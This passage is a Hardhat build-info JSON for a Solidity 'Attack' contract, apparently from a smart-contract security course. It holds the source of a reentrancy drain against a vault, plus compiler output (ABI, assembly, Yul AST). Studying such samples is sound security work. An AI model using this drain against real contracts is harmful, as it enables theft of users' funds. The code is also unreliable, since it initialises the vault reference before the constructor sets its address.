{
	"id": "b1b6fe13c8b947fc69b29480182aee89",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.24",
	"solcLongVersion": "0.8.24+commit.e11b9ed9",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/my_contract_calyptus/Reentrancy/Attack.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.6;\n \ninterface IVault{\n   function deposit() external payable;\n   function withdraw() external;\n}\n \ncontract Attack {\n   address vaultAddress;\n   constructor(address _vaultAddress){\n      vaultAddress =  _vaultAddress;\n   }\n   IVault vault = IVault(vaultAddress);\n   function attack() external payable {\n       require(msg.value >= 1 ether);\n       vault.deposit{value: 1 ether}();\n       vault.withdraw();\n   }\n\n   \n   fallback() external payable {\n       if (address(vault).balance >= 1 ether) {\n           vault.withdraw();\n       }\n   }\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/my_contract_calyptus/Reentrancy/Attack.sol": {
				"Attack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_vaultAddress",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"stateMutability": "payable",
							"type": "fallback"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":153:595  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":302:314  vaultAddress */\n  0x00\n  dup1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":280:315  IVault vault = IVault(vaultAddress) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":199:276  constructor(address _vaultAddress){... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":257:270  _vaultAddress */\n  dup1\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":241:253  vaultAddress */\n  0x00\n  dup1\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":241:270  vaultAddress =  _vaultAddress */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":199:276  constructor(address _vaultAddress){... */\n  pop\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":153:595  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":153:595  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":153:595  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":540:547  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":522:527  vault */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":514:536  address(vault).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":514:547  address(vault).balance >= 1 ether */\n      lt\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":510:588  if (address(vault).balance >= 1 ether) {... */\n      tag_6\n      jumpi\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":562:567  vault */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":562:576  vault.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":562:578  vault.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_7:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_9:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":510:588  if (address(vault).balance >= 1 ether) {... */\n    tag_6:\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":153:595  contract Attack {... */\n      stop\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":320:464  function attack() external payable {... */\n    tag_3:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n    tag_11:\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":385:392  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":372:381  msg.value */\n      callvalue\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":372:392  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":364:393  require(msg.value >= 1 ether) */\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":402:407  vault */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":402:415  vault.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":423:430  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":402:433  vault.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":442:447  vault */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":442:456  vault.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":442:458  vault.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_19:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/my_contract_calyptus/Reentrancy/Attack.sol\":320:464  function attack() external payable {... */\n      jump\t// out\n\n    auxdata: 0xa26469706673582212203ce1937d5845b34d18b73de438ce7138fc4ce89252e8fa6b540fc3218d7973a964736f6c63430008180033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_20": {
									"entryPoint": null,
									"id": 20,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 287,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 307,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 248,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 217,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 213,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 265,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:1199:1",
										"nodeType": "YulBlock",
										"src": "0:1199:1",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:1",
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nativeSrc": "57:19:1",
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:1",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nativeSrc": "67:9:1",
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:1",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:1",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nativeSrc": "177:28:1",
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:1",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:1",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nativeSrc": "187:12:1",
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nativeSrc": "187:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nativeSrc": "300:28:1",
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:1",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:1",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nativeSrc": "310:12:1",
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nativeSrc": "310:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nativeSrc": "379:81:1",
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nativeSrc": "389:65:1",
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:1",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nativeSrc": "400:54:1",
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:1",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:1",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nativeSrc": "511:51:1",
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nativeSrc": "521:35:1",
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:1",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nativeSrc": "532:24:1",
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:1",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:1",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nativeSrc": "611:79:1",
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:1",
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:1",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:1",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nativeSrc": "670:12:1",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nativeSrc": "670:12:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:1",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:1",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nativeSrc": "641:24:1",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:1",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nativeSrc": "631:35:1",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nativeSrc": "624:43:1",
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nativeSrc": "621:63:1",
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:1",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nativeSrc": "759:80:1",
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nativeSrc": "769:22:1",
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "784:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "778:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nativeSrc": "778:13:1",
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "769:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "827:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "800:26:1",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nativeSrc": "800:33:1",
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nativeSrc": "800:33:1",
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nativeSrc": "696:143:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "737:6:1",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "745:3:1",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "753:5:1",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nativeSrc": "922:274:1",
													"nodeType": "YulBlock",
													"src": "922:274:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "968:83:1",
																"nodeType": "YulBlock",
																"src": "968:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "970:77:1",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:1"
																			},
																			"nativeSrc": "970:79:1",
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:1"
																		},
																		"nativeSrc": "970:79:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "943:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "952:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "939:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:1"
																		},
																		"nativeSrc": "939:23:1",
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "964:2:1",
																		"nodeType": "YulLiteral",
																		"src": "964:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "935:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:1"
																},
																"nativeSrc": "935:32:1",
																"nodeType": "YulFunctionCall",
																"src": "935:32:1"
															},
															"nativeSrc": "932:119:1",
															"nodeType": "YulIf",
															"src": "932:119:1"
														},
														{
															"nativeSrc": "1061:128:1",
															"nodeType": "YulBlock",
															"src": "1061:128:1",
															"statements": [
																{
																	"nativeSrc": "1076:15:1",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:1",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1090:1:1",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1080:6:1",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1105:74:1",
																	"nodeType": "YulAssignment",
																	"src": "1105:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1151:9:1",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:1"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1162:6:1",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1147:3:1",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:1"
																				},
																				"nativeSrc": "1147:22:1",
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1171:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1115:31:1",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:1"
																		},
																		"nativeSrc": "1115:64:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1105:6:1",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nativeSrc": "845:351:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "892:9:1",
														"nodeType": "YulTypedName",
														"src": "892:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "903:7:1",
														"nodeType": "YulTypedName",
														"src": "903:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "915:6:1",
														"nodeType": "YulTypedName",
														"src": "915:6:1",
														"type": ""
													}
